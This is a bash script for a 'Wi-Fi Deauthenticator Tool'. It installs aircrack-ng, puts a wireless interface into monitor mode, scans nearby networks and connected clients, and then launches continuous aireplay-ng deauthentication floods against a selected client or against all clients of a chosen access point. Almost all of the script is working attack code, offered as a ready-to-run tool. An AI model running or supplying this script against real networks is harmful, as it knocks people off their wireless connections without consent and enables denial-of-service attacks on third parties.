#!/bin/bash

# Load in the functions and animations
source ./bash_loading_animations.sh
# Run BLA::stop_loading_animation if the script is interrupted
trap BLA::stop_loading_animation SIGINT

# Function to set colors using tput
set_colors() {
  bold=$(tput bold)
  underline=$(tput smul)
  standout=$(tput smso)
  normal=$(tput sgr0)
  black=$(tput setaf 0)
  red=$(tput setaf 1)
  green=$(tput setaf 2)
  yellow=$(tput setaf 3)
  blue=$(tput setaf 4)
  magenta=$(tput setaf 5)
  cyan=$(tput setaf 6)
  white=$(tput setaf 7)
}

# Custom prompt function
custom_prompt() {
  echo -en '\033[;31m┌──\033[41;37m '$(whoami)'@'$(hostname)' \033[0m\033[104;30m '$(pwd)' \033[0m ~\n\033[;31m└─\033[1;31m➜ \033[;37m$ \033[0m'
}

# Function to display the header
display_header() {
  clear
  figlet -c -f slant "Wi-Fi Deauthenticator Tool" | lolcat
}

# Function to list all wireless interfaces
list_wireless_interfaces() {
  interfaces=$(iw dev | grep Interface | awk '{print $2}')
  if [ -z "$interfaces" ]; then
    echo -e "${bold}${red}No wireless interfaces found.${normal}"
    exit 1
  fi
  echo -e "${bold}${green}##########################${normal}"
  echo -e "${bold}${green}# Available interfaces:  #${normal}"
  echo -e "${bold}${green}##########################${normal}"
  count=0
  for interface in $interfaces; do
    echo -e "${bold}${blue}$count)${normal} ${bold}${cyan}$interface${normal}"
    ((count++))
  done
}

# Function to install necessary packages
install_packages() {
  echo -e "${bold}${green}Checking and installing necessary packages...${normal}"
  packages=("aircrack-ng" "iw" "net-tools" "figlet" "lolcat" "toilet" "boxes")

  for package in "${packages[@]}"; do
    if ! dpkg -s $package >/dev/null 2>&1; then
      echo -e "${bold}${yellow}Installing $package...${normal}"
      apt-get install -y $package
    else
      echo -e "${bold}${green}$package is already installed.${normal}"
    fi
  done

  # Install lolcat gem if not already installed
  if ! gem list -i lolcat; then
    echo -e "${bold}${yellow}Installing lolcat...${normal}"
    gem install lolcat
  else
    echo -e "${bold}${green}lolcat is already installed.${normal}"
  fi
}

# Function to validate BSSID
validate_bssid() {
  if [[ ! $BSSID =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo -e "${bold}${red}Invalid BSSID format. Please enter a valid MAC address (e.g., 00:11:22:33:44:55).${normal}"
    exit 1
  fi
}

# Function to kill interfering processes selectively
kill_interfering_processes() {
  echo -e "${bold}${green}Checking for interfering processes...${normal}"
  interfering_procs=$(airmon-ng check | grep 'PID' -A 999 | grep -v 'PID' | awk '{print $1}')
  
  for proc in $interfering_procs; do
    proc_iface=$(cat /proc/$proc/net/dev | grep -vE 'lo|Iface' | awk '{print $1}' | tr -d ':')
    if [[ "$proc_iface" == "$INTERFACE" ]]; then
      echo -e "${bold}${yellow}Killing process $proc for interface $INTERFACE...${normal}"
      kill $proc
    fi
  done
}

# Function to stop interfaces in monitor mode
stop_monitor_mode_interfaces() {
  echo -e "${bold}${green}Stopping interfaces in monitor mode...${normal}"
  monitor_interfaces=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
  for interface in $monitor_interfaces; do
    echo -e "${bold}${yellow}Stopping monitor mode on $interface...${normal}"
    airmon-ng stop $interface
  done
}

# Function to clean up generated files
cleanup() {
  echo -e "${bold}${yellow}Cleaning up...${normal}"
  rm -f scan_results* filtered_scan_results.csv deauth_log* injection_test_log.txt client_scan_results* filtered_client_scan_results.csv
}

# Function to stop the monitor mode interface and deauth attack
stop_attack() {
  echo -e "${bold}${yellow}Stopping the deauthentication attack...${normal}"
  kill $AIREPLAY_PID
  echo -e "${bold}${yellow}Disabling monitor mode on $MONITOR_INTERFACE...${normal}"
  airmon-ng stop $MONITOR_INTERFACE
  cleanup
  echo -e "${bold}${green}Attack stopped and monitor mode disabled.${normal}"
  exit 0
}

# Function to send deauth packets and display an animation
send_deauth_packets() {
  local bssid=$1
  local monitor_interface=$2
  local client_mac=$3
  local client_list=("${!4}")  # Expecting an array of clients

  # Check if the interface is in monitor mode
  if ! iwconfig $monitor_interface | grep -q "Mode:Monitor"; then
    echo "Interface $monitor_interface is not in monitor mode. Please set it to monitor mode."
    return 1
  fi

  # Check if packet injection is supported
  sudo aireplay-ng --test $monitor_interface > injection_test_log.txt 2>&1

  if ! grep -q "Injection is working!" injection_test_log.txt; then
    echo "Packet injection is not supported on this interface: $monitor_interface"
    cat injection_test_log.txt
    return 1
  fi

  if [ "$client_mac" == "FF:FF:FF:FF:FF:FF" ]; then
    echo "Deauthenticating all clients..."
    for client in "${client_list[@]}"; do
      echo "Deauthenticating client $client..."
      sudo aireplay-ng -0 0 -a $bssid -c $client -p 10 --ignore-negative-one $monitor_interface > "deauth_log_$client.txt" 2>&1 &
    done
  else
    echo "Deauthenticating client $client_mac..."
    sudo aireplay-ng -0 0 -a $bssid -c $client_mac -p 10 --ignore-negative-one $monitor_interface > deauth_log.txt 2>&1 &
  fi

  AIREPLAY_PID=$!

  BLA::start_loading_animation "${BLA_modern_metro[@]}"

  while kill -0 $AIREPLAY_PID 2>/dev/null; do
    sleep 0.1
  done

  BLA::stop_loading_animation

  # Check if deauth attack succeeded
  if grep -q "No such BSSID available" deauth_log.txt; then
    echo "Failed to deauthenticate. No such BSSID available."
    return 1
  fi

  echo "Deauthentication packets sent."
}

# Function to scan for clients connected to the selected network
scan_for_clients() {
  echo -e "${bold}${green}Scanning for clients connected to the network...${normal}"
  timeout 30s airodump-ng --bssid $BSSID --channel $CHANNEL --output-format csv -w client_scan_results $MONITOR_INTERFACE &
  SCAN_CLIENT_PID=$!
  wait $SCAN_CLIENT_PID

  # Filter out the clients from the scan results
  awk 'NR == 1 || !/^Station MAC/ {print $0}' client_scan_results-01.csv | awk 'NF >= 6' > filtered_client_scan_results.csv

  clear
  echo -e "${bold}${green}##########################${normal}"
  echo -e "${bold}${green}# Available clients:     #${normal}"
  echo -e "${bold}${green}##########################${normal}"
  count=0
  clients=()
  while IFS=, read -r station_mac first_seen last_seen power packets bssid probed_essids; do
    if [[ $station_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
      clients+=("$station_mac")
      echo -e "${bold}${blue}$count)${normal} ${bold}${cyan}$station_mac${normal}"
      ((count++))
    fi
  done < filtered_client_scan_results.csv

  echo -e "${bold}${blue}$count)${normal} ${bold}${cyan}All clients${normal}"
  clients+=("FF:FF:FF:FF:FF:FF")

  if [ ${#clients[@]} -eq 0 ]; then
    echo -e "${bold}${red}No clients found. Exiting.${normal}"
    airmon-ng stop $MONITOR_INTERFACE
    cleanup
    exit 1
  fi

  echo -e "${bold}${green}Enter the number corresponding to the client you want to deauth (or 'a' for all clients):${normal}"
  custom_prompt
  read -r client_num

  if [ -z "${clients[$client_num]}" ]; then
    echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
    airmon-ng stop $MONITOR_INTERFACE
    cleanup
    exit 1
  fi

  CLIENT_MAC=${clients[$client_num]}
}

# Initialize colors
set_colors

# Trap CTRL+C (SIGINT) to stop the attack gracefully
trap stop_attack SIGINT

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${bold}${red}Please run as root${normal}"
  exit
fi

# Install necessary packages
install_packages

# Display header
display_header

# Kill interfering processes
kill_interfering_processes

# Stop interfaces in monitor mode
stop_monitor_mode_interfaces

# List wireless interfaces and let the user pick one
list_wireless_interfaces

# Custom prompt for input
echo -e "${bold}${green}Enter the number corresponding to the interface you want to use:${normal}"
custom_prompt
read -r interface_num

INTERFACE=$(iw dev | grep Interface | awk '{print $2}' | sed -n "$((interface_num+1))p")

if [ -z "$INTERFACE" ]; then
  echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
  exit 1
fi

# Variables
CHANNEL=""          # Channel of the target network
BSSID=""            # BSSID of the target network
MONITOR_INTERFACE=""

# Step 1: Enable monitor mode
echo -e "${bold}${green}Enabling monitor mode on $INTERFACE...${normal}"
airmon-ng start $INTERFACE

# Get the monitor mode interface name (e.g., wlan0mon)
MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')

# Step 2: Scan for networks to get BSSID and channel
echo -e "${bold}${green}Scanning for networks (will stop automatically after 1 minute)...${normal}"
custom_prompt
timeout 15s airodump-ng $MONITOR_INTERFACE --output-format csv -w scan_results &
SCAN_PID=$!
wait $SCAN_PID

# Remove duplicate headers and filter out invalid lines
awk 'NR == 1 || !/^BSSID/ {print $0}' scan_results-01.csv | awk 'NF >= 15' > filtered_scan_results.csv

# Display scanned networks and let the user pick one
clear
echo -e "${bold}${green}##########################${normal}"
echo -e "${bold}${green}# Available networks:    #${normal}"
echo -e "${bold}${green}##########################${normal}"
count=0
networks=()
while IFS=, read -r bssid first_seen last_seen channel speed privacy cipher authentication power beacons iv lanip id_length essid key; do
  if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && $channel -ge 1 && $channel -le 14 ]]; then
    networks+=("$bssid,$channel,$essid")
    echo -e "${bold}${blue}$count)${normal} ${bold}${cyan}$essid ($bssid) on channel $channel${normal}"
    ((count++))
  fi
done < filtered_scan_results.csv

if [ ${#networks[@]} -eq 0 ]; then
  echo -e "${bold}${red}No networks found. Exiting.${normal}"
  airmon-ng stop $MONITOR_INTERFACE
  cleanup
  exit 1
fi

# Decorative prompt for network selection
echo -e "${bold}${green}Enter the number corresponding to the network you want to deauth:${normal}"
custom_prompt
read -r network_num

if [ -z "${networks[$network_num]}" ]; then
  echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
  airmon-ng stop $MONITOR_INTERFACE
  cleanup
  exit 1
fi

IFS=',' read -r BSSID CHANNEL ESSID <<< "${networks[$network_num]}"

# Step 3: Set the channel
echo -e "${bold}${green}Setting the channel to $CHANNEL...${normal}"
iwconfig $MONITOR_INTERFACE channel $CHANNEL

# Step 3.5: Scan for clients connected to the selected network
scan_for_clients

# Step 4: Send deauthentication packets
echo -e "${bold}${green}Sending deauthentication packets to client $CLIENT_MAC...${normal}"
send_deauth_packets $BSSID $MONITOR_INTERFACE $CLIENT_MAC clients[@]

# Keep the script running to allow the deauth attack to continue
while true; do
  sleep 1
done
